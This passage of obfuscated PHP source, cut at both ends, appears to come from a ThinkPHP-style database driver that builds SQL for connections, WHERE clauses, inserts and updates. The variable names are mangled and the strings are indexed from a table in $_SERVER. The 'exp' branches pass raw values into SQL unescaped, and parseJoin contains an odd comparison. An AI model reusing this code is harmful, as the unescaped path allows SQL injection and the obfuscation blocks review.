$this->parseDSN(think_config($¶¢¯¿ˆî[1030])); } else { $´ê„®åİ = array($¶¢¯¿ˆî[1016] => think_config($¶¢¯¿ˆî[1031]), $¶¢¯¿ˆî[943] => think_config($¶¢¯¿ˆî[1032]), $¶¢¯¿ˆî[944] => think_config($¶¢¯¿ˆî[1033]), $¶¢¯¿ˆî[941] => think_config($¶¢¯¿ˆî[1034]), $¶¢¯¿ˆî[942] => think_config($¶¢¯¿ˆî[1035]), $¶¢¯¿ˆî[21] => think_config($¶¢¯¿ˆî[323]), $¶¢¯¿ˆî[971] => think_config($¶¢¯¿ˆî[1030]), $¶¢¯¿ˆî[17] => think_config($¶¢¯¿ˆî[1036])); } } return $´ê„®åİ; } protected function initConnect($®İƒæå… = true) { if (1 == think_config($_SERVER[ìïæ“œî][22])) { $this->_linkID = $this->multiConnect($®İƒæå…); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $û«á£ù· => $äş“åÃ‚) { $this->_linkID = $äş“åÃ‚; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($áÃîÕÛı = false) { $áôå’¼Â =& $_SERVER[ìïæ“œî]; static $úÁ¾¥Ÿ = array(); static $Ó†Ù²ë¿ = -1; if (empty($úÁ¾¥Ÿ)) { foreach ($this->config as $ÁèîàÔ€ => $ëûïËáÜ) { $úÁ¾¥Ÿ[$ÁèîàÔ€] = explode($áôå’¼Â[50], $ëûïËáÜ); } } if (think_config($áôå’¼Â[1037])) { if ($áÃîÕÛı || think_config($áôå’¼Â[471]) === !0) { $Íò¸Û³¶ = floor(mt_rand(0, think_config($áôå’¼Â[1038]) - 1)); $Ó†Ù²ë¿ = $Íò¸Û³¶; } else { if (is_numeric(think_config($áôå’¼Â[1039]))) { $Íò¸Û³¶ = think_config($áôå’¼Â[1039]); } else { $Íò¸Û³¶ = floor(mt_rand(think_config($áôå’¼Â[1038]), count($úÁ¾¥Ÿ[$áôå’¼Â[941]]) - 1)); } } } else { $Íò¸Û³¶ = floor(mt_rand(0, count($úÁ¾¥Ÿ[$áôå’¼Â[941]]) - 1)); $Ó†Ù²ë¿ = $Íò¸Û³¶; } $Íò¸Û³¶ = $Ó†Ù²ë¿ !== -1 ? $Ó†Ù²ë¿ : $Íò¸Û³¶; $™ÂÊ²”ø = array($áôå’¼Â[943] => isset($úÁ¾¥Ÿ[$áôå’¼Â[943]][$Íò¸Û³¶]) ? $úÁ¾¥Ÿ[$áôå’¼Â[943]][$Íò¸Û³¶] : $úÁ¾¥Ÿ[$áôå’¼Â[943]][0], $áôå’¼Â[944] => isset($úÁ¾¥Ÿ[$áôå’¼Â[944]][$Íò¸Û³¶]) ? $úÁ¾¥Ÿ[$áôå’¼Â[944]][$Íò¸Û³¶] : $úÁ¾¥Ÿ[$áôå’¼Â[944]][0], $áôå’¼Â[941] => isset($úÁ¾¥Ÿ[$áôå’¼Â[941]][$Íò¸Û³¶]) ? $úÁ¾¥Ÿ[$áôå’¼Â[941]][$Íò¸Û³¶] : $úÁ¾¥Ÿ[$áôå’¼Â[941]][0], $áôå’¼Â[942] => isset($úÁ¾¥Ÿ[$áôå’¼Â[942]][$Íò¸Û³¶]) ? $úÁ¾¥Ÿ[$áôå’¼Â[942]][$Íò¸Û³¶] : $úÁ¾¥Ÿ[$áôå’¼Â[942]][0], $áôå’¼Â[21] => isset($úÁ¾¥Ÿ[$áôå’¼Â[21]][$Íò¸Û³¶]) ? $úÁ¾¥Ÿ[$áôå’¼Â[21]][$Íò¸Û³¶] : $úÁ¾¥Ÿ[$áôå’¼Â[21]][0], $áôå’¼Â[971] => isset($úÁ¾¥Ÿ[$áôå’¼Â[971]][$Íò¸Û³¶]) ? $úÁ¾¥Ÿ[$áôå’¼Â[971]][$Íò¸Û³¶] : $úÁ¾¥Ÿ[$áôå’¼Â[971]][0], $áôå’¼Â[17] => isset($úÁ¾¥Ÿ[$áôå’¼Â[17]][$Íò¸Û³¶]) ? $úÁ¾¥Ÿ[$áôå’¼Â[17]][$Íò¸Û³¶] : $úÁ¾¥Ÿ[$áôå’¼Â[17]][0]); return $this->connect($™ÂÊ²”ø, $Íò¸Û³¶); } public function parseDSN($²«¯«Íš) { $ë£®ñÜ =& $_SERVER[ìïæ“œî]; if (empty($²«¯«Íš)) { return !1; } $¸åÈãÒ = parse_url($²«¯«Íš); if ($¸åÈãÒ[$ë£®ñÜ[207]]) { $äÃ‰õĞ = array($ë£®ñÜ[1016] => $¸åÈãÒ[$ë£®ñÜ[207]], $ë£®ñÜ[943] => isset($¸åÈãÒ[$ë£®ñÜ[662]]) ? $¸åÈãÒ[$ë£®ñÜ[662]] : $ë£®ñÜ[12], $ë£®ñÜ[944] => isset($¸åÈãÒ[$ë£®ñÜ[1040]]) ? $¸åÈãÒ[$ë£®ñÜ[1040]] : $ë£®ñÜ[12], $ë£®ñÜ[941] => isset($¸åÈãÒ[$ë£®ñÜ[208]]) ? $¸åÈãÒ[$ë£®ñÜ[208]] : $ë£®ñÜ[12], $ë£®ñÜ[942] => isset($¸åÈãÒ[$ë£®ñÜ[209]]) ? $¸åÈãÒ[$ë£®ñÜ[209]] : $ë£®ñÜ[12], $ë£®ñÜ[21] => isset($¸åÈãÒ[$ë£®ñÜ[87]]) ? substr($¸åÈãÒ[$ë£®ñÜ[87]], 1) : $ë£®ñÜ[12]); } else { preg_match($ë£®ñÜ[1041], trim($²«¯«Íš), $æ”Œ‰®•); $äÃ‰õĞ = array($ë£®ñÜ[1016] => $æ”Œ‰®•[1], $ë£®ñÜ[943] => $æ”Œ‰®•[2], $ë£®ñÜ[944] => $æ”Œ‰®•[3], $ë£®ñÜ[941] => $æ”Œ‰®•[4], $ë£®ñÜ[942] => $æ”Œ‰®•[5], $ë£®ñÜ[21] => $æ”Œ‰®•[6]); } $äÃ‰õĞ[$ë£®ñÜ[971]] = $ë£®ñÜ[12]; return $äÃ‰õĞ; } protected function debug() { $Â¿Àåûã =& $_SERVER[ìïæ“œî]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Â¿Àåûã[1042]; if (think_config($Â¿Àåûã[1043])) { think_status($Â¿Àåûã[1044]); think_trace($this->queryStr . $Â¿Àåûã[1045] . think_status($Â¿Àåûã[24], $Â¿Àåûã[1044], 6) . $Â¿Àåûã[1046], $Â¿Àåûã[12], $Â¿Àåûã[1047]); } } protected function parseLock($¾÷ºÊÕ¢ = false) { $ƒŸ—…œ‡ =& $_SERVER[ìïæ“œî]; if (!$¾÷ºÊÕ¢) { return $ƒŸ—…œ‡[12]; } if ($ƒŸ—…œ‡[973] == $this->dbType) { return $ƒŸ—…œ‡[1048]; } return $ƒŸ—…œ‡[1049]; } protected function parseSet($«¸ëÄˆ“) { $“µ†½ÏŒ =& $_SERVER[ìïæ“œî]; foreach ($«¸ëÄˆ“ as $šìØÂÉ± => $©¾ å²) { if (is_array($©¾ å²) && $“µ†½ÏŒ[373] == $©¾ å²[0]) { $îÅ¦ş¨ß[] = $this->parseKey($šìØÂÉ±) . $“µ†½ÏŒ[939] . $©¾ å²[1]; } elseif (is_scalar($©¾ å²) || is_null($©¾ å²)) { $îÅ¦ş¨ß[] = $this->parseKey($šìØÂÉ±) . $“µ†½ÏŒ[939] . $this->parseValue($©¾ å²); } } return $“µ†½ÏŒ[1050] . implode($“µ†½ÏŒ[50], $îÅ¦ş¨ß); } protected function bindParam($‚ùªŒÇ, $½ïñ“Øï) { $this->bind[$_SERVER[ìïæ“œî][4] . $‚ùªŒÇ] = $½ïñ“Øï; } protected function parseBind($ÜŞäñ¹Å) { $ÜŞäñ¹Å = array_merge($this->bind, $ÜŞäñ¹Å); $this->bind = array(); return $ÜŞäñ¹Å; } function parseKey(&$Ÿ««“¸Í, $¢¦¹ª˜‹ = true) { if ($¢¦¹ª˜‹) { $Ÿ««“¸Í = $this->parseKeyCheck($Ÿ««“¸Í); } return $Ÿ««“¸Í; } function parseKeyCheck($úï¼öÜ) { $õüàÃôò =& $_SERVER[ìïæ“œî]; $úï¼öÜ = trim($úï¼öÜ); if (!preg_match($õüàÃôò[1051], $úï¼öÜ)) { think_exception($õüàÃôò[1052] . $úï¼öÜ); } return $úï¼öÜ; } protected function parseValue($ß¯ƒ‰‡Ñ) { $Å ¡Î =& $_SERVER[ìïæ“œî]; if (is_string($ß¯ƒ‰‡Ñ)) { $ß¯ƒ‰‡Ñ = $Å ¡Î[1012] . $this->escapeString($ß¯ƒ‰‡Ñ) . $Å ¡Î[1012]; } elseif (isset($ß¯ƒ‰‡Ñ[0]) && is_string($ß¯ƒ‰‡Ñ[0]) && strtolower($ß¯ƒ‰‡Ñ[0]) == $Å ¡Î[373]) { $ß¯ƒ‰‡Ñ = $this->escapeString($ß¯ƒ‰‡Ñ[1]); } elseif (is_array($ß¯ƒ‰‡Ñ)) { $ß¯ƒ‰‡Ñ = array_map(array($this, $Å ¡Î[1013]), $ß¯ƒ‰‡Ñ); } elseif (is_bool($ß¯ƒ‰‡Ñ)) { $ß¯ƒ‰‡Ñ = $ß¯ƒ‰‡Ñ ? $Å ¡Î[91] : $Å ¡Î[228]; } elseif (is_null($ß¯ƒ‰‡Ñ)) { $ß¯ƒ‰‡Ñ = $Å ¡Î[106]; } return $ß¯ƒ‰‡Ñ; } protected function parseField($ó¢Î”‚) { $¤áë¹×õ =& $_SERVER[ìïæ“œî]; if (is_string($ó¢Î”‚) && strpos($ó¢Î”‚, $¤áë¹×õ[50])) { $ó¢Î”‚ = explode($¤áë¹×õ[50], $ó¢Î”‚); } if (is_array($ó¢Î”‚)) { $ÒÊÑªáØ = array(); foreach ($ó¢Î”‚ as $Úˆ‹ø˜ª => $Ó†âÒ¥İ) { if (!is_numeric($Úˆ‹ø˜ª)) { $ÒÊÑªáØ[] = $this->parseKey($Úˆ‹ø˜ª, !1) . $¤áë¹×õ[1053] . $this->parseKey($Ó†âÒ¥İ); } else { $ÒÊÑªáØ[] = $this->parseKey($Ó†âÒ¥İ); } } $ ¤ÖÚÈš = implode($¤áë¹×õ[50], $ÒÊÑªáØ); } elseif (is_string($ó¢Î”‚) && !empty($ó¢Î”‚)) { $ ¤ÖÚÈš = $ó¢Î”‚; } else { $ ¤ÖÚÈš = $¤áë¹×õ[220]; } return $ ¤ÖÚÈš; } protected function parseTable($€ˆ•åŠ›) { $¡Ìò…Ñô =& $_SERVER[ìïæ“œî]; if (is_array($€ˆ•åŠ›)) { $Èå½úÊ = array(); foreach ($€ˆ•åŠ› as $ª‰·™÷ß => $ù¢ô÷Ëë) { if (!is_numeric($ª‰·™÷ß)) { $Èå½úÊ[] = $this->parseKey($ª‰·™÷ß) . $¡Ìò…Ñô[53] . $this->parseKey($ù¢ô÷Ëë); } else { $Èå½úÊ[] = $this->parseKey($ª‰·™÷ß); } } $€ˆ•åŠ› = $Èå½úÊ; } elseif (is_string($€ˆ•åŠ›)) { if (strstr($€ˆ•åŠ›, $¡Ìò…Ñô[53])) { return $€ˆ•åŠ›; } $€ˆ•åŠ› = explode($¡Ìò…Ñô[50], $€ˆ•åŠ›); array_walk($€ˆ•åŠ›, array($this, $¡Ìò…Ñô[961])); } return $¡Ìò…Ñô[955] . trim(implode($¡Ìò…Ñô[1054], $€ˆ•åŠ›), $¡Ìò…Ñô[461]) . $¡Ìò…Ñô[955]; } protected function parseWhere($Š‚÷¿õê) { $ÈÛÆĞÀ =& $_SERVER[ìïæ“œî]; $²çØÛå¤ = $ÈÛÆĞÀ[12]; if (is_string($Š‚÷¿õê)) { $²çØÛå¤ = $Š‚÷¿õê; } else { $‡Âãƒ = isset($Š‚÷¿õê[$ÈÛÆĞÀ[1055]]) ? strtoupper($Š‚÷¿õê[$ÈÛÆĞÀ[1055]]) : $ÈÛÆĞÀ[12]; if (in_array($‡Âãƒ, array($ÈÛÆĞÀ[1056], $ÈÛÆĞÀ[1057], $ÈÛÆĞÀ[1058]))) { $‡Âãƒ = $ÈÛÆĞÀ[53] . $‡Âãƒ . $ÈÛÆĞÀ[53]; unset($Š‚÷¿õê[$ÈÛÆĞÀ[1055]]); } else { $‡Âãƒ = $ÈÛÆĞÀ[1059]; } foreach ($Š‚÷¿õê as $èÚÖ‚ => $Ïô«Ğ²) { $²çØÛå¤ .= $ÈÛÆĞÀ[354]; if (is_numeric($èÚÖ‚)) { $èÚÖ‚ = $ÈÛÆĞÀ[1060]; } if (0 === strpos($èÚÖ‚, $ÈÛÆĞÀ[11])) { $²çØÛå¤ .= $this->parseThinkWhere($èÚÖ‚, $Ïô«Ğ²); } else { if (!preg_match($ÈÛÆĞÀ[1061], trim($èÚÖ‚))) { think_exception(think_lang($ÈÛÆĞÀ[1062]) . $ÈÛÆĞÀ[4] . $èÚÖ‚); } $½™·×† = is_array($Ïô«Ğ²) && isset($Ïô«Ğ²[$ÈÛÆĞÀ[1063]]); $èÚÖ‚ = trim($èÚÖ‚); if (strpos($èÚÖ‚, $ÈÛÆĞÀ[214])) { $¹Ùª€´ = explode($ÈÛÆĞÀ[214], $èÚÖ‚); $àÛ£Â = array(); foreach ($¹Ùª€´ as $ŒşÄá => $‹ÛÒ¼ù) { $‡»¢Ù— = $½™·×† ? $Ïô«Ğ²[$ŒşÄá] : $Ïô«Ğ²; $àÛ£Â[] = $ÈÛÆĞÀ[337] . $this->parseWhereItem($this->parseKey($‹ÛÒ¼ù), $‡»¢Ù—) . $ÈÛÆĞÀ[960]; } $²çØÛå¤ .= implode($ÈÛÆĞÀ[1064], $àÛ£Â); } elseif (strpos($èÚÖ‚, $ÈÛÆĞÀ[360])) { $¹Ùª€´ = explode($ÈÛÆĞÀ[360], $èÚÖ‚); $àÛ£Â = array(); foreach ($¹Ùª€´ as $ŒşÄá => $‹ÛÒ¼ù) { $‡»¢Ù— = $½™·×† ? $Ïô«Ğ²[$ŒşÄá] : $Ïô«Ğ²; $àÛ£Â[] = $ÈÛÆĞÀ[337] . $this->parseWhereItem($this->parseKey($‹ÛÒ¼ù), $‡»¢Ù—) . $ÈÛÆĞÀ[960]; } $²çØÛå¤ .= implode($ÈÛÆĞÀ[1059], $àÛ£Â); } else { $²çØÛå¤ .= $this->parseWhereItem($this->parseKey($èÚÖ‚), $Ïô«Ğ²); } } $²çØÛå¤ .= $ÈÛÆĞÀ[355] . $‡Âãƒ; } $²çØÛå¤ = substr($²çØÛå¤, 0, -strlen($‡Âãƒ)); } return empty($²çØÛå¤) ? $ÈÛÆĞÀ[12] : $ÈÛÆĞÀ[1065] . $²çØÛå¤; } protected function parseWhereItem($ğòü«Ä, $Âñƒ¡¬Ê) { $ËÅÖÔüŞ =& $_SERVER[ìïæ“œî]; $ÖáôÓ = $ËÅÖÔüŞ[12]; if (is_array($Âñƒ¡¬Ê)) { if (is_string($Âñƒ¡¬Ê[0])) { $ƒ‰Ş€  = strtolower($Âñƒ¡¬Ê[0]); if (in_array($Âñƒ¡¬Ê[0], array($ËÅÖÔüŞ[939], $ËÅÖÔüŞ[1066], $ËÅÖÔüŞ[1067], $ËÅÖÔüŞ[1068], $ËÅÖÔüŞ[1069], $ËÅÖÔüŞ[1070]))) { $ÖáôÓ .= $ğòü«Ä . $ËÅÖÔüŞ[53] . $Âñƒ¡¬Ê[0] . $ËÅÖÔüŞ[53] . $this->parseValue($Âñƒ¡¬Ê[1]); } elseif (preg_match($ËÅÖÔüŞ[1071], $Âñƒ¡¬Ê[0])) { $ÖáôÓ .= $ğòü«Ä . $ËÅÖÔüŞ[53] . $this->exp[$ƒ‰Ş€ ] . $ËÅÖÔüŞ[53] . $this->parseValue($Âñƒ¡¬Ê[1]); } elseif (preg_match($ËÅÖÔüŞ[1072], $Âñƒ¡¬Ê[0])) { if (is_array($Âñƒ¡¬Ê[1])) { $äŸªÜ­ = isset($Âñƒ¡¬Ê[2]) ? strtoupper($Âñƒ¡¬Ê[2]) : $ËÅÖÔüŞ[1057]; if (in_array($äŸªÜ­, array($ËÅÖÔüŞ[1056], $ËÅÖÔüŞ[1057], $ËÅÖÔüŞ[1058]))) { $éİáƒ±É = array(); foreach ($Âñƒ¡¬Ê[1] as $Ôş’ï«Æ) { $éİáƒ±É[] = $ğòü«Ä . $ËÅÖÔüŞ[53] . $this->exp[$ƒ‰Ş€ ] . $ËÅÖÔüŞ[53] . $this->parseValue($Ôş’ï«Æ); } $ÖáôÓ .= $ËÅÖÔüŞ[337] . implode($ËÅÖÔüŞ[53] . $äŸªÜ­ . $ËÅÖÔüŞ[53], $éİáƒ±É) . $ËÅÖÔüŞ[960]; } } else { $ÖáôÓ .= $ğòü«Ä . $ËÅÖÔüŞ[53] . $this->exp[$ƒ‰Ş€ ] . $ËÅÖÔüŞ[53] . $this->parseValue($Âñƒ¡¬Ê[1]); } } elseif ($ËÅÖÔüŞ[373] == $ƒ‰Ş€ ) { $ÖáôÓ .= $ËÅÖÔüŞ[958] . $ğòü«Ä . $ËÅÖÔüŞ[53] . $Âñƒ¡¬Ê[1] . $ËÅÖÔüŞ[1073]; } elseif (preg_match($ËÅÖÔüŞ[1074], $Âñƒ¡¬Ê[0])) { $ÖáôÓ .= $Âñƒ¡¬Ê[0]; } elseif (preg_match($ËÅÖÔüŞ[1075], $Âñƒ¡¬Ê[0])) { if (isset($Âñƒ¡¬Ê[2]) && $ËÅÖÔüŞ[373] == $Âñƒ¡¬Ê[2]) { $ÖáôÓ .= $ğòü«Ä . $ËÅÖÔüŞ[53] . $this->exp[$ƒ‰Ş€ ] . $ËÅÖÔüŞ[53] . $Âñƒ¡¬Ê[1]; } else { if (is_string($Âñƒ¡¬Ê[1])) { $Âñƒ¡¬Ê[1] = explode($ËÅÖÔüŞ[50], $Âñƒ¡¬Ê[1]); } $ù”¤÷æ³ = implode($ËÅÖÔüŞ[50], $this->parseValue($Âñƒ¡¬Ê[1])); $ÖáôÓ .= $ğòü«Ä . $ËÅÖÔüŞ[53] . $this->exp[$ƒ‰Ş€ ] . $ËÅÖÔüŞ[958] . $ù”¤÷æ³ . $ËÅÖÔüŞ[960]; } } elseif (preg_match($ËÅÖÔüŞ[1076], $Âñƒ¡¬Ê[0])) { $Òâ¹ÚœÀ = is_string($Âñƒ¡¬Ê[1]) ? explode($ËÅÖÔüŞ[50], $Âñƒ¡¬Ê[1]) : $Âñƒ¡¬Ê[1]; $ÖáôÓ .= $ËÅÖÔüŞ[958] . $ğòü«Ä . $ËÅÖÔüŞ[53] . $this->exp[$ƒ‰Ş€ ] . $ËÅÖÔüŞ[53] . $this->parseValue($Òâ¹ÚœÀ[0]) . $ËÅÖÔüŞ[1059] . $this->parseValue($Òâ¹ÚœÀ[1]) . $ËÅÖÔüŞ[355]; } else { think_exception(think_lang($ËÅÖÔüŞ[1062]) . $ËÅÖÔüŞ[4] . $Âñƒ¡¬Ê[0]); } } else { $„íö¦ÓŠ = count($Âñƒ¡¬Ê); $“öÖ‹›« = $ËÅÖÔüŞ[12]; if (is_string($Âñƒ¡¬Ê[$„íö¦ÓŠ - 1])) { $“öÖ‹›« = isset($Âñƒ¡¬Ê[$„íö¦ÓŠ - 1]) ? strtoupper($Âñƒ¡¬Ê[$„íö¦ÓŠ - 1]) : $ËÅÖÔüŞ[12]; if (in_array($“öÖ‹›«, array($ËÅÖÔüŞ[1056], $ËÅÖÔüŞ[1057], $ËÅÖÔüŞ[1058]))) { $„íö¦ÓŠ = $„íö¦ÓŠ - 1; } } else { $“öÖ‹›« = $ËÅÖÔüŞ[1056]; } for ($ùú–Ä¿ = 0; $ùú–Ä¿ < $„íö¦ÓŠ; $ùú–Ä¿++) { $Òâ¹ÚœÀ = is_array($Âñƒ¡¬Ê[$ùú–Ä¿]) ? $Âñƒ¡¬Ê[$ùú–Ä¿][1] : $Âñƒ¡¬Ê[$ùú–Ä¿]; if ($ËÅÖÔüŞ[373] == strtolower($Âñƒ¡¬Ê[$ùú–Ä¿][0])) { $ÖáôÓ .= $ËÅÖÔüŞ[337] . $ğòü«Ä . $ËÅÖÔüŞ[53] . $Òâ¹ÚœÀ . $ËÅÖÔüŞ[1073] . $“öÖ‹›« . $ËÅÖÔüŞ[53]; } else { $œ²àÆ²Ø = is_array($Âñƒ¡¬Ê[$ùú–Ä¿]) ? $this->exp[strtolower($Âñƒ¡¬Ê[$ùú–Ä¿][0])] : $ËÅÖÔüŞ[939]; if (!$œ²àÆ²Ø && is_array($Âñƒ¡¬Ê[$ùú–Ä¿]) && in_array($Âñƒ¡¬Ê[$ùú–Ä¿][0], array($ËÅÖÔüŞ[939], $ËÅÖÔüŞ[1066], $ËÅÖÔüŞ[1067], $ËÅÖÔüŞ[1068], $ËÅÖÔüŞ[1069], $ËÅÖÔüŞ[1070]))) { $œ²àÆ²Ø = $Âñƒ¡¬Ê[$ùú–Ä¿][0]; } $ÖáôÓ .= $ËÅÖÔüŞ[337] . $ğòü«Ä . $ËÅÖÔüŞ[53] . $œ²àÆ²Ø . $ËÅÖÔüŞ[53] . $this->parseValue($Òâ¹ÚœÀ) . $ËÅÖÔüŞ[1073] . $“öÖ‹›« . $ËÅÖÔüŞ[53]; } } $ÖáôÓ = substr($ÖáôÓ, 0, -4); } } else { $ÖáôÓ .= $ğòü«Ä . $ËÅÖÔüŞ[1077] . $this->parseValue($Âñƒ¡¬Ê); } return $ÖáôÓ; } protected function parseThinkWhere($„§ªÑÎ…, $çËïÇØ) { $ÂúšŠñ¾ =& $_SERVER[ìïæ“œî]; $àâôÈù‹ = $ÂúšŠñ¾[12]; switch ($„§ªÑÎ…) { case $ÂúšŠñ¾[428]: $àâôÈù‹ = $çËïÇØ; break; case $ÂúšŠñ¾[1060]: $àâôÈù‹ = is_string($çËïÇØ) ? $çËïÇØ : substr($this->parseWhere($çËïÇØ), 6); break; case $ÂúšŠñ¾[1078]: parse_str($çËïÇØ, $—İøÊ±û); if (isset($—İøÊ±û[$ÂúšŠñ¾[1055]])) { $³½û½Çè = $ÂúšŠñ¾[53] . strtoupper($—İøÊ±û[$ÂúšŠñ¾[1055]]) . $ÂúšŠñ¾[53]; unset($—İøÊ±û[$ÂúšŠñ¾[1055]]); } else { $³½û½Çè = $ÂúšŠñ¾[1059]; } $Ø”•·æş = array(); foreach ($—İøÊ±û as $ŸÅ¯¿¶— => $ÅªğšÉğ) { $Ø”•·æş[] = $this->parseKey($ŸÅ¯¿¶—) . $ÂúšŠñ¾[1077] . $this->parseValue($ÅªğšÉğ); } $àâôÈù‹ = implode($³½û½Çè, $Ø”•·æş); break; } return $àâôÈù‹; } protected function parseLimit($åÃëç´·) { $‚âÈï±‘ =& $_SERVER[ìïæ“œî]; return !empty($åÃëç´·) ? $‚âÈï±‘[51] . $åÃëç´· . $‚âÈï±‘[53] : $‚âÈï±‘[12]; } protected function parseJoin($ÅøàÖ§Ä) { $³Ìòé­ =& $_SERVER[ìïæ“œî]; $­É ­¼ß = $³Ìòé­[12]; if (!empty($ÅøàÖ§Ä)) { if (is_array($ÅøàÖ§Ä)) { foreach ($ÅøàÖ§Ä as $ËÌ¨ÃˆÍ => $Çº‚çëØ) { if (!1 !== stripos($Çº‚çëØ, $³Ìòé­[1079])) { $­É ­¼ß .= $³Ìòé­[53] . $Çº‚çëØ; } else { $­É ­¼ß .= $³Ìòé­[1080] . $Çº‚çëØ; } } } else { $­É ­¼ß .= $³Ìòé­[1080] . $ÅøàÖ§Ä; } } $­É ­¼ß = preg_replace($³Ìòé­[1081], think_config($³Ìòé­[985]) . $³Ìòé­[1082], $­É ­¼ß); return $­É ­¼ß; } protected function parseOrder($‹£²õË ) { $Øşïå—“ =& $_SERVER[ìïæ“œî]; if (is_array($‹£²õË )) { $óíşÆ÷ = array(); foreach ($‹£²õË  as $ığ—»Ø£ => $ÎÂı•é) { if (is_numeric($ığ—»Ø£)) { $óíşÆ÷[] = $this->parseKey($ÎÂı•é); } else { $ÎÂı•é = in_array(strtoupper(trim($ÎÂı•é)), array($Øşïå—“[1083], $Øşïå—“[1084])) ? $Øşïå—“[53] . $ÎÂı•é : $Øşïå—“[12]; if (preg_match($Øşïå—“[1085], $ığ—»Ø£)) { $óíşÆ÷[] = $this->parseKey($ığ—»Ø£) . $ÎÂı•é; } else { think_exception($Øşïå—“[1086] . $ığ—»Ø£); } } } $‹£²õË  = implode($Øşïå—“[50], $óíşÆ÷); } return !empty($‹£²õË ) ? $Øşïå—“[1087] . $‹£²õË  : $Øşïå—“[12]; } protected function parseGroup($ş“¹‘) { $­ŠÚ÷åí =& $_SERVER[ìïæ“œî]; return !empty($ş“¹‘) ? $­ŠÚ÷åí[1088] . $ş“¹‘ : $­ŠÚ÷åí[12]; } protected function parseHaving($éıß‚¥“) { $¶¬ÊÁã =& $_SERVER[ìïæ“œî]; return !empty($éıß‚¥“) ? $¶¬ÊÁã[1089] . $éıß‚¥“ : $¶¬ÊÁã[12]; } protected function parseComment($±¸¦ôŠï) { $Ä¾ë©ÁÜ =& $_SERVER[ìïæ“œî]; return !empty($±¸¦ôŠï) ? $Ä¾ë©ÁÜ[1090] . $±¸¦ôŠï . $Ä¾ë©ÁÜ[1091] : $Ä¾ë©ÁÜ[12]; } protected function parseDistinct($×‡€€) { $À”úÆŸĞ =& $_SERVER[ìïæ“œî]; return !empty($×‡€€) ? $À”úÆŸĞ[1092] : $À”úÆŸĞ[12]; } protected function parseUnion($’”³æÒ„) { $ıÇù¦õá =& $_SERVER[ìïæ“œî]; if (empty($’”³æÒ„)) { return $ıÇù¦õá[12]; } if (isset($’”³æÒ„[$ıÇù¦õá[424]])) { $÷äâ“à¤ = $ıÇù¦õá[1093]; unset($’”³æÒ„[$ıÇù¦õá[424]]); } else { $÷äâ“à¤ = $ıÇù¦õá[1094]; } foreach ($’”³æÒ„ as $¬¾£Ò¿Ó) { $¸‘ ©Ã[] = $÷äâ“à¤ . (is_array($¬¾£Ò¿Ó) ? $this->buildSelectSql($¬¾£Ò¿Ó) : $¬¾£Ò¿Ó); } return implode($ıÇù¦õá[53], $¸‘ ©Ã); } public function insert($¸¼…¥Íµ, $ŞåéÒ³ğ = array(), $¸·ÏÔâæ = false) { $şÖµÛü =& $_SERVER[ìïæ“œî]; $ıİÄ›Şš = $ î‚›ïş = array(); $this->model = $ŞåéÒ³ğ[$şÖµÛü[358]]; foreach ($¸¼…¥Íµ as $ ‡ßğÈº => $ÑøÅ³±í) { if (is_array($ÑøÅ³±í) && $şÖµÛü[373] == $ÑøÅ³±í[0]) { $ î‚›ïş[] = $this->parseKey($ ‡ßğÈº); $ıİÄ›Şš[] = $ÑøÅ³±í[1]; } elseif (is_scalar($ÑøÅ³±í) || is_null($ÑøÅ³±í)) { $ î‚›ïş[] = $this->parseKey($ ‡ßğÈº); $ıİÄ›Şš[] = $this->parseValue($ÑøÅ³±í); } } $Äø‰ªÍ‘ = ($¸·ÏÔâæ ? $şÖµÛü[962] : $şÖµÛü[963]) . $şÖµÛü[964] . $this->parseTable($ŞåéÒ³ğ[$şÖµÛü[356]]) . $şÖµÛü[958] . implode($şÖµÛü[50], $ î‚›ïş) . $şÖµÛü[959] . implode($şÖµÛü[50], $ıİÄ›Şš) . $şÖµÛü[960]; $Äø‰ªÍ‘ .= $this->parseLock(isset($ŞåéÒ³ğ[$şÖµÛü[892]]) ? $ŞåéÒ³ğ[$şÖµÛü[892]] : !1); $Äø‰ªÍ‘ .= $this->parseComment(!empty($ŞåéÒ³ğ[$şÖµÛü[430]]) ? $ŞåéÒ³ğ[$şÖµÛü[430]] : $şÖµÛü[12]); return $this->execute($Äø‰ªÍ‘, $this->parseBind(!empty($ŞåéÒ³ğ[$şÖµÛü[361]]) ? $ŞåéÒ³ğ[$şÖµÛü[361]] : array())); } public function selectInsert($ì÷ø«¸ù, $¹áâ–È, $ÓÒ¯Á§Ã = array()) { $®Í©Ş’ı =& $_SERVER[ìïæ“œî]; $this->model = $ÓÒ¯Á§Ã[$®Í©Ş’ı[358]]; if (is_string($ì÷ø«¸ù)) { $ì÷ø«¸ù = explode($®Í©Ş’ı[50], $ì÷ø«¸ù); } array_walk($ì÷ø«¸ù, array($this, $®Í©Ş’ı[961])); $èïù·ô» = $®Í©Ş’ı[1095] . $this->parseTable($¹áâ–È) . $®Í©Ş’ı[958] . implode($®Í©Ş’ı[50], $ì÷ø«¸ù) . $®Í©Ş’ı[1073]; $èïù·ô» .= $this->buildSelectSql($ÓÒ¯Á§Ã); return $this->execute($èïù·ô», $this->parseBind(!empty($ÓÒ¯Á§Ã[$®Í©Ş’ı[361]]) ? $ÓÒ¯Á§Ã[$®Í©Ş’ı[361]] : array())); } public function update($óÌæ²», $øş¯çäĞ) { $­ğ‘©ª =& $_SERVER[ìïæ“œî]; $this->model = $øş¯çäĞ[$­ğ‘©ª[358]]; $²îŞÍÂí = $­ğ‘©ª[1096] . $this->parseTable($øş¯çäĞ[$­ğ‘©ª[356]]) . $this->parseSet($óÌæ²») . $this->parseWhere(!empty($øş¯çäĞ[$­ğ‘©ª[352]]) ? $øş¯çäĞ[$­ğ‘©ª[352]] : $­ğ‘©ª[12]) . $this->parseOrder(!empty($øş¯çäĞ[$­ğ‘©ª[441]]) ? $øş¯çäĞ[$­ğ‘©ª[441]] : $­ğ‘©ª[12]) . $this->parseLimit(!empty($øş¯çäĞ[$­ğ‘©ª[368]]) ? $øş¯çäĞ[$­ğ‘©ª[368]] : $­ğ‘©ª[12]) . $this->parseLock(isset($øş¯çäĞ[$­ğ‘©ª[892]]) ? $øş¯çäĞ[$­ğ‘©ª[892]] : !1) . $this->parseComment(!empty($øş¯çäĞ[$­ğ‘©ª[430]]) ? $øş¯çäĞ[$­ğ‘©ª[430]] : 